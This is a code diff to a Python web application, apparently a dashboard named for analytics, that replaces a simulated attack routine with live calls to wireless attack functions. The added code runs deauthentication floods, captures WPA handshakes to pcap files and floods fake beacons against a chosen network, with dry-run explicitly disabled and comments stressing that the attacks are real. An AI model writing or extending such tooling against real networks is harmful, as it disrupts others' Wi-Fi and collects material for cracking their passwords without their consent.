@@ -36,24 +36,79 @@ def scan_networks(interface='wlan0'):
         is_scanning = False
 
 def execute_attack(target, attack_type):
+    """Execute REAL attack using attack modules"""
     global is_attacking
     is_attacking = True
-    add_log_entry('info', f'Starting {attack_type} attack on {target.get("ssid", "Hidden")}')
+    add_log_entry('info', f'Starting REAL {attack_type} attack on {target.get("ssid", "Hidden")}')
     
-    time.sleep(2)  # Simulate attack
-    
-    result = {
-        'status': 'success',
-        'attack_type': attack_type,
-        'target': target,
-        'timestamp': time.time(),
-        'message': f'{attack_type} attack completed successfully'
-    }
-    
-    active_attacks.append(result)
-    is_attacking = False
-    add_log_entry('success', f'{attack_type} attack completed')
-    return result
+    try:
+        # Import attack functions
+        from attacks import deauth_attack, handshake_capture, beacon_flood
+        
+        success = False
+        message = ""
+        
+        if attack_type == 'deauth':
+            success = deauth_attack(
+                interface='wlan0',
+                target_bssid=target.get('bssid'),
+                packet_count=30,
+                dry_run=False
+            )
+            message = f"Deauth attack {'completed successfully' if success else 'failed'}"
+            
+        elif attack_type == 'handshake_capture':
+            output_file = f"/tmp/handshake_{target.get('bssid', '').replace(':', '')}.pcap"
+            success = handshake_capture(
+                interface='wlan0',
+                target_bssid=target.get('bssid'),
+                output_file=output_file,
+                duration=30
+            )
+            message = f"Handshake capture {'completed successfully' if success else 'failed'}"
+            
+        elif attack_type == 'beacon_flood':
+            success = beacon_flood(
+                interface='wlan0',
+                ssid=target.get('ssid', 'FakeAP'),
+                packet_count=50,
+                interval=0.1
+            )
+            message = f"Beacon flood {'completed successfully' if success else 'failed'}"
+            
+        else:
+            message = f"Unknown attack type: {attack_type}"
+            success = False
+        
+        result = {
+            'status': 'success' if success else 'failed',
+            'attack_type': attack_type,
+            'target': target,
+            'timestamp': time.time(),
+            'message': message,
+            'success': success
+        }
+        
+        active_attacks.append(result)
+        is_attacking = False
+        add_log_entry('success' if success else 'error', f'{attack_type} attack {message}')
+        return result
+        
+    except Exception as e:
+        result = {
+            'status': 'error',
+            'attack_type': attack_type,
+            'target': target,
+            'timestamp': time.time(),
+            'message': f'Attack failed: {str(e)}',
+            'success': False,
+            'error': str(e)
+        }
+        
+        active_attacks.append(result)
+        is_attacking = False
+        add_log_entry('error', f'{attack_type} attack failed: {str(e)}')
+        return result
 
 @app.route('/')
 def analytics_dashboard():
